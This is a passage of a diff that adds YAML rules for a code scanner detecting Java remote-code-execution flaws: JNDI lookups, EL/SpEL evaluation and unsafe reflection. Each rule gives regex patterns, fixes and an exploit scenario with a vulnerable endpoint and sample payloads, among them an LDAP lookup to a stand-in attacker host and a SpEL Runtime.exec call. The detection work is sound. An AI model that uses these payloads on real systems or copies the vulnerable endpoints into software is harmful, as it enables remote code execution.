+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "JNDI injection enables remote class loading and deserialization for full RCE"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.getParameter('name')"
+        sink: "ctx.lookup(name)"
+        through: "servlet parameter to JNDI lookup"
+      - source: "request.getHeader('X-Api-Key')"
+        sink: "logger.info('Key: ' + apiKey)"
+        through: "HTTP header to Log4j logging to JNDI lookup"
+      - source: "@RequestParam String resource"
+        sink: "jndiTemplate.lookup(resource)"
+        through: "Spring parameter to JNDI lookup"
+    impact: |
+      Remote code execution via JNDI class loading (LDAP/RMI):
+      - Arbitrary deserialization of malicious Java objects
+      - Full JVM and OS-level compromise
+      - Log4Shell-class vulnerabilities affecting the entire infrastructure
+      - Data exfiltration via DNS JNDI provider
+    remediation: |
+      Never pass user input to JNDI lookup:
+
+      ```java
+      // VULNERABLE:
+      ctx.lookup(userInput);
+
+      // SECURE: Use allowlist for JNDI names
+      private static final Set<String> ALLOWED_JNDI = Set.of(
+          "java:comp/env/jdbc/MainDB",
+          "java:comp/env/jms/OrderQueue"
+      );
+
+      public Object safeLookup(String name) throws NamingException {
+          if (!ALLOWED_JNDI.contains(name)) {
+              throw new SecurityException("JNDI name not allowed: " + name);
+          }
+          return new InitialContext().lookup(name);
+      }
+
+      // JVM flags to restrict JNDI protocols (Java 8u191+):
+      // -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
+      // -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+      - "https://www.lunasec.io/docs/blog/log4j-zero-day/"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'import\s+javax\.naming\.'
+        - 'InitialContext'
+        - 'class\s+\w+(?:Controller|Service|Handler)\s'
+        - '@(?:GetMapping|PostMapping|RequestMapping)'
+      taint_source_indicators:
+        - 'request\.getParameter\s*\('
+        - 'request\.getHeader\s*\('
+        - '@RequestParam\s+'
+        - '@RequestBody\s+'
+        - '@PathVariable\s+'
+      taint_sink_indicators:
+        - '\.lookup\s*\('
+        - 'NamingManager\.\w+\s*\('
+        - 'InitialContext\s*\(\s*\)'
+        - 'JndiTemplate.*lookup\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_JNDI'
+        - 'jndi\.allowlist'
+        - 'validateJndiName\s*\('
+        - 'trustURLCodebase\s*=\s*false'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + remote_class_loading_factor)"
+      exploitability_score: "Critical"
+    exploit_scenario:
+      attack_example: |
+        A Java application uses JNDI for resource lookup:
+
+        @GetMapping("/api/resource")
+        public String getResource(@RequestParam String name) {
+            Context ctx = new InitialContext();
+            Object resource = ctx.lookup(name);
+            return resource.toString();
+        }
+
+        Attacker sends:
+        GET /api/resource?name=ldap://attacker.com:1389/Exploit
+
+        The server connects to the attacker's LDAP server, which returns
+        a reference to a malicious Java class that executes arbitrary code.
+      example_payload: "ldap://attacker.com:1389/Exploit"
+      attacker_objective: "Execute arbitrary code via JNDI remote class loading"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2026-02-28"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JAVA-001"
+        - "RCE-JAVA-003"
+        - "RCE-JAVA-005"
+
+  # --------------------------------------------------------------------------
+  # RCE-JAVA-005: Expression Language (EL) Evaluation
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JAVA-005"
+    title: "Expression Language Evaluation with User Input"
+    description: >
+      Detects usage of Java Expression Language (EL), Unified EL, or Spring
+      Expression Language (SpEL) where the expression string is derived from
+      user-controlled input. EL/SpEL provide powerful capabilities including
+      method invocation, constructor calls, property access, type references,
+      and operator overloading. When user input is evaluated as an EL/SpEL
+      expression, attackers can invoke Runtime.exec(), access the ClassLoader,
+      or perform any Java operation available via reflection. SpEL injection
+      and EL injection are common and critical RCE vectors in Java applications.
+    language: java
+    category: rce
+    severity: High
+    confidence: 0.94
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - spel
+      - expression-language
+      - el-injection
+      - spring
+      - code-injection
+      - java
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'SpelExpressionParser\s*[\s\S]{0,300}\.parseExpression\s*\(\s*(?:request\.getParameter|req\.getParameter|param|input|expression|expr|user|data)'
+        description: "SpEL parser with user-controlled expression"
+      - type: regex
+        pattern: '\.parseExpression\s*\(\s*(?:request\.|expr|expression|input|user|data|param|formula)\s*\)[\s\S]{0,200}\.getValue\s*\('
+        description: "SpEL parseExpression followed by getValue with user input"
+      - type: regex
+        pattern: 'ExpressionFactory[\s\S]{0,200}\.createValueExpression\s*\([^,]*,\s*(?:request\.|input|expr|user|data|param)'
+        description: "EL ExpressionFactory.createValueExpression with user input"
+      - type: regex
+        pattern: 'ELProcessor[\s\S]{0,200}\.eval\s*\(\s*(?:request\.|input|expr|user|data|param)'
+        description: "ELProcessor.eval with user-controlled expression"
+      - type: regex
+        pattern: 'String\s+(?:expression|expr|spel)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}parseExpression\s*\('
+        description: "Expression from request parameter used in EL/SpEL parsing"
+      - type: regex
+        pattern: 'StandardEvaluationContext[\s\S]{0,200}\.setVariable\s*\(\s*"[^"]+"\s*,\s*(?:request\.|input|user|data|param)'
+        description: "SpEL context with user-controlled variable values"
+    anti_patterns:
+      - '\.parseExpression\s*\(\s*"[^"]*"\s*\)'
+      - '\.parseExpression\s*\(\s*(?:EXPRESSION|SPEL|Constants\.)\s*\)'
+      - '@Test'
+      - 'class\s+\w+Test\s'
+      - 'import\s+org\.(?:junit|mockito)'
+      - 'Mockito\.\w+'
+      - '@SpringBootTest'
+      - '@MockBean'
+      - 'SimpleEvaluationContext\.forReadOnlyDataBinding'
+    bypass_variants:
+      - description: "T() operator for type access and static method invocation"
+        pattern: 'parseExpression\s*\(.*?T\s*\(\s*java\.lang\.'
+      - description: "New object construction via SpEL"
+        pattern: 'parseExpression\s*\(.*?new\s+java\.'
+      - description: "Reflection via SpEL for class loading"
+        pattern: 'parseExpression\s*\(.*?(?:forName|getDeclaredMethod|invoke)\s*\('
+      - description: "Spring Bean access via SpEL"
+        pattern: 'parseExpression\s*\(.*?(?:@\w+|#\w+)\s*\.'
+    evasion_indicators:
+      - "T() operator for Java class access in SpEL"
+      - "Runtime.getRuntime().exec() via T(java.lang.Runtime)"
+      - "Reflection chain via SpEL"
+      - "New object instantiation in expression"
+      - "Bean reference and method invocation"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: 'parseExpression\s*\(.*?\\u[0-9A-Fa-f]{4}'
+      - type: "string_concat_evasion"
+        pattern: 'parseExpression\s*\(\s*"[^"]*"\s*\.\s*concat\s*\('
+      - type: "char_conversion"
+        pattern: 'parseExpression\s*\(.*?new\s+String\s*\(\s*new\s+(?:char|byte)\s*\['
+    multi_function_chain_patterns:
+      - "request.getParameter('expr') -> parser.parseExpression(expr) -> expression.getValue()"
+      - "@RequestParam expression -> SpEL parse -> T(Runtime).exec() -> RCE"
+      - "user input -> StandardEvaluationContext -> SpEL evaluation -> method invocation"
+      - "user input -> ELProcessor.eval -> Java method access -> command execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "EL/SpEL provides full Java class access via T() operator for arbitrary code execution"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.getParameter('expression')"
+        sink: "parser.parseExpression(expression).getValue(context)"
+        through: "servlet parameter to SpEL evaluation"
+      - source: "@RequestParam String filter"
+        sink: "parser.parseExpression(filter).getValue()"
+        through: "Spring parameter to SpEL filter expression"
+      - source: "request.getParameter('formula')"
+        sink: "elProcessor.eval(formula)"
+        through: "formula parameter to EL evaluation"
+    impact: |
+      Arbitrary Java method invocation via EL/SpEL:
+      - OS command execution via Runtime.exec() or ProcessBuilder
+      - File system access via java.io classes
+      - Spring Bean access and method invocation
+      - Full JVM and system compromise
+    remediation: |
+      Use SimpleEvaluationContext instead of StandardEvaluationContext:
+
+      ```java
+      // VULNERABLE:
+      StandardEvaluationContext ctx = new StandardEvaluationContext();
+      parser.parseExpression(userExpr).getValue(ctx);
+
+      // SECURE: SimpleEvaluationContext with read-only access
+      SimpleEvaluationContext ctx = SimpleEvaluationContext
+          .forReadOnlyDataBinding()
+          .withRootObject(rootObject)
+          .build();
+      parser.parseExpression(expression).getValue(ctx);
+
+      // Even safer: validate expression against allowlist
+      Pattern SAFE_EXPR = Pattern.compile("^[a-zA-Z][a-zA-Z0-9.]+$");
+      if (!SAFE_EXPR.matcher(expression).matches()) {
+          throw new IllegalArgumentException("Invalid expression");
+      }
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"
+      - "https://portswigger.net/research/expression-language-injection"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'import\s+org\.springframework\.expression\.'
+        - 'SpelExpressionParser'
+        - 'ExpressionParser'
+        - 'ELProcessor'
+        - 'ExpressionFactory'
+        - 'class\s+\w+(?:Controller|Service|Handler)\s'
+      taint_source_indicators:
+        - 'request\.getParameter\s*\('
+        - '@RequestParam\s+'
+        - '@RequestBody\s+'
+        - '@PathVariable\s+'
+        - 'request\.getHeader\s*\('
+      taint_sink_indicators:
+        - '\.parseExpression\s*\('
+        - '\.getValue\s*\('
+        - '\.eval\s*\('
+        - 'createValueExpression'
+      sanitization_patterns:
+        - 'SimpleEvaluationContext'
+        - 'forReadOnlyDataBinding\s*\('
+        - 'ALLOWED_EXPRESSIONS'
+        - 'expression\.matches\s*\('
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + spring_bean_access_risk)"
+      exploitability_score: "Critical"
+    exploit_scenario:
+      attack_example: |
+        A Spring Boot API evaluates SpEL expressions for dynamic filtering:
+
+        @GetMapping("/api/search")
+        public List<Item> search(@RequestParam String filter) {
+            ExpressionParser parser = new SpelExpressionParser();
+            StandardEvaluationContext ctx = new StandardEvaluationContext();
+            ctx.setRootObject(items);
+            return parser.parseExpression(filter).getValue(ctx, List.class);
+        }
+
+        Attacker sends:
+        GET /api/search?filter=T(java.lang.Runtime).getRuntime().exec('id')
+      example_payload: "T(java.lang.Runtime).getRuntime().exec('id')"
+      attacker_objective: "Execute arbitrary Java code via EL/SpEL injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2026-02-28"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JAVA-001"
+        - "RCE-JAVA-003"
+        - "RCE-JAVA-006"
+
+  # --------------------------------------------------------------------------
+  # RCE-JAVA-006: Unsafe Reflection with User Class Names
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JAVA-006"
+    title: "Unsafe Reflection with User-Controlled Class Names"
+    description: >
+      Detects Java reflection patterns where the class name, method name, or
+      constructor arguments are derived from user-controlled input. Class.forName()
+      with a user-supplied class name allows arbitrary class loading and
+      instantiation. Combined with Method.invoke() and Constructor.newInstance(),
+      attackers can instantiate any class on the classpath and invoke any method,
+      including Runtime.exec() and ProcessBuilder.start(). This is a fundamental
+      RCE vector when reflection parameters are controllable.
+    language: java
+    category: rce
+    severity: High
+    confidence: 0.90
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - reflection
+      - class-forname
+      - class-loading
+      - code-injection
+      - java
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'Class\.forName\s*\(\s*(?:request\.getParameter|req\.getParameter|param|input|className|clsName|type|user|data)'
+        description: "Class.forName with user-controlled class name"
+      - type: regex
+        pattern: 'Class\.forName\s*\(\s*(?:className|clazz|type|name)\s*\)[\s\S]{0,300}\.(?:newInstance|getMethod|getDeclaredMethod|getConstructor)\s*\('
+        description: "Class.forName followed by instantiation or method access"
+      - type: regex
+        pattern: '\.getMethod\s*\(\s*(?:request\.|methodName|method|action|input|user|param)'
+        description: "getMethod with user-controlled method name"
+      - type: regex
+        pattern: '\.invoke\s*\(\s*(?:instance|obj|target)\s*,[\s\S]{0,100}(?:request\.|param|input|user|args)'
+        description: "Method.invoke with user-controlled arguments"
+      - type: regex
+        pattern: 'String\s+(?:className|clazz|type)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}Class\.forName\s*\('
+        description: "Class name from request parameter used in Class.forName"
+      - type: regex
+        pattern: 'Thread\.currentThread\s*\(\s*\)\s*\.getContextClassLoader\s*\(\s*\)\s*\.loadClass\s*\(\s*(?:request\.|className|input|user|param)'
+        description: "ClassLoader.loadClass with user-controlled class name"
+      - type: regex
+        pattern: 'URLClassLoader[\s\S]{0,200}(?:request\.|url|input|user|param)[\s\S]{0,200}loadClass\s*\('
+        description: "URLClassLoader with user-controlled URL and class loading"
+    anti_patterns:
+      - 'Class\.forName\s*\(\s*"[a-zA-Z0-9.]+"\s*\)'
+      - 'Class\.forName\s*\(\s*(?:DRIVER|CLASS_NAME|Constants\.)\s*\)'
+      - '@Test'
+      - 'class\s+\w+Test\s'
+      - 'import\s+org\.(?:junit|mockito)'
+      - 'Mockito\.\w+'
+      - '@SpringBootTest'
+      - '@MockBean'
+      - 'Class\.forName\s*\(\s*"(?:com\.mysql|oracle\.jdbc|org\.postgresql)'
+    bypass_variants:
+      - description: "Class loaded via ServiceLoader"
+        pattern: 'ServiceLoader\.load\s*\(\s*Class\.forName\s*\(\s*(?:request\.|input|user)'
+      - description: "Factory pattern with user-controlled type"
+        pattern: '(?:factory|Factory)[\s\S]{0,200}Class\.forName\s*\(\s*(?:type|className|input)'
+      - description: "Proxy-based reflection bypass"
+        pattern: 'Proxy\.newProxyInstance[\s\S]{0,200}(?:request\.|input|user|className)'
+      - description: "MethodHandle for reflection bypass"
+        pattern: 'MethodHandles\.lookup\s*\(\s*\)[\s\S]{0,200}(?:request\.|input|className)'
+    evasion_indicators:
+      - "Class.forName with concatenated or formatted class name"
+      - "ClassLoader.loadClass from user-controlled URL"
+      - "Method.invoke with dynamically resolved method name"
+      - "Constructor.newInstance with user-controlled arguments"
+      - "MethodHandle used instead of traditional reflection"
+    encoding_variants:
+      - type: "url_encoded_class"
+        pattern: 'Class\.forName\s*\(.*?%[0-9A-Fa-f]{2}'
+      - type: "string_builder_class"
+        pattern: 'StringBuilder[\s\S]{0,200}Class\.forName'
+      - type: "property_lookup"
+        pattern: 'Properties[\s\S]{0,200}getProperty[\s\S]{0,200}Class\.forName'
+    multi_function_chain_patterns:
+      - "request.getParameter('class') -> Class.forName(cls) -> newInstance()"
+      - "@RequestParam className -> Class.forName -> getMethod -> invoke"
+      - "user input -> class name -> Class.forName -> constructor -> newInstance -> RCE"
+      - "className + methodName -> Class.forName -> getDeclaredMethod -> setAccessible -> invoke"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Unrestricted Class.forName enables loading any class on classpath including Runtime for RCE"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.getParameter('class')"
+        sink: "Class.forName(className).newInstance()"
+        through: "servlet parameter to class loading"
+      - source: "@RequestParam String type"
+        sink: "Class.forName(type).getMethod(method).invoke()"
+        through: "Spring parameter to reflection invocation"
+      - source: "request.getParameter('action')"
+        sink: "method.invoke(instance, args)"
+        through: "action parameter to method invocation"
+    impact: |
+      Unsafe reflection with user input enables full RCE:
+      - Arbitrary class instantiation on the classpath
+      - Any method invocation including Runtime.exec()
+      - Private method access via setAccessible(true)
+      - Remote class loading via URLClassLoader
+      - Full system compromise with JVM privileges
+    remediation: |
+      Use allowlist for class and method names:
+
+      ```java
+      // VULNERABLE:
+      Class<?> cls = Class.forName(request.getParameter("class"));
+      Object obj = cls.newInstance();
+
+      // SECURE: Allowlist of permitted classes
+      private static final Map<String, Class<?>> ALLOWED = Map.of(
+          "csv", CsvExporter.class,
+          "pdf", PdfExporter.class,
+          "xlsx", XlsxExporter.class
+      );
+
+      public Exporter getExporter(String type) {
+          Class<?> cls = ALLOWED.get(type);
+          if (cls == null) {
+              throw new IllegalArgumentException("Unknown exporter: " + type);
+          }
+          return (Exporter) cls.getDeclaredConstructor().newInstance();
+      }
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'Class\.forName'
+        - 'newInstance'
+        - 'getMethod'
+        - 'getDeclaredMethod'
+        - 'invoke'
+        - 'class\s+\w+(?:Controller|Service|Handler|Factory)\s'
+      taint_source_indicators:
+        - 'request\.getParameter\s*\('
+        - '@RequestParam\s+'
+        - '@RequestBody\s+'
+        - '@PathVariable\s+'
+        - 'Properties\.getProperty'
+      taint_sink_indicators:
+        - 'Class\.forName\s*\('
+        - '\.newInstance\s*\('
+        - '\.invoke\s*\('
+        - '\.loadClass\s*\('
+        - '\.getConstructor\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_CLASSES'
+        - 'CLASS_ALLOWLIST'
+        - 'validateClassName\s*\('
+        - 'instanceof'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + unrestricted_reflection_risk)"
+      exploitability_score: "Critical"
+    exploit_scenario:
+      attack_example: |
+        A Java application uses reflection for plugin loading:
+
+        @PostMapping("/api/plugin")
+        public String loadPlugin(@RequestParam String className,
+                                 @RequestParam String method) {
+            Class<?> cls = Class.forName(className);
+            Object instance = cls.getDeclaredConstructor().newInstance();
+            Method m = cls.getMethod(method);
+            Object result = m.invoke(instance);
+            return result.toString();
+        }
+
+        Attacker sends:
+        POST /api/plugin?className=java.lang.Runtime&method=exec
+        with appropriate arguments to execute arbitrary commands.
+      example_payload: "className=java.lang.ProcessBuilder&method=start"
+      attacker_objective: "Load arbitrary classes and invoke methods via unrestricted reflection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2026-02-28"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JAVA-001"
+        - "RCE-JAVA-003"
+        - "RCE-JAVA-005"
